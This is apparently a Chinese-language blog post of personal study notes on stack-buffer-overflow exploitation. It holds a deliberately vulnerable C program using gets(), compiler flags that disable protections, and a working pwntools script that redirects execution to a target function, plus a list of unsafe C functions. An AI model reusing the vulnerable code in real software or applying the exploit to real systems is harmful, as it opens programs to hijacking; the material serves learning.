---
title: pwn学习
description: 试试学学pwn，不知道能不能学下去

date: 2026-04-01T20:12:52+08:00
lastmod: 2026-04-01T20:15:52+08:00
---
# PWN学习

## 栈溢出原理

```c
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

```bash
gcc -m64 -no-pie -z execstack -fno-stack-protector stack\ overflow.c -o stack_example
```

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Payload = 缓冲区大小 (Buffer) + 栈帧指针大小 (Saved RBP) + 目标返回地址 (RIP)

```c
int vulnerable()
{
  char s[12]; // [rsp+4h] [rbp-Ch] BYREF

  gets();
  return puts(s);
}
```

64 位系统的地址和寄存器宽度都是 **8 字节**（32 位系统则是 4 字节）

```python
from pwn import *

elf = ELF('./stack_example')
target_addr = elf.symbols['success']
io = process('./stack_example')
payload = b'1' * 20 + p64(target_addr)

io.sendline(payload)
io.interactive()
```

成功溢出到success

**危险函数**

- 输入
  - gets，直接读取一行，忽略'\x00'
  - scanf
  - vscanf
- 输出
  - sprintf
- 字符串
  - strcpy，字符串复制，遇到'\x00'停止
  - strcat，字符串拼接，遇到'\x00'停止
  - bcopy

## 返回导向编程 ROP原理

### ret2text

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

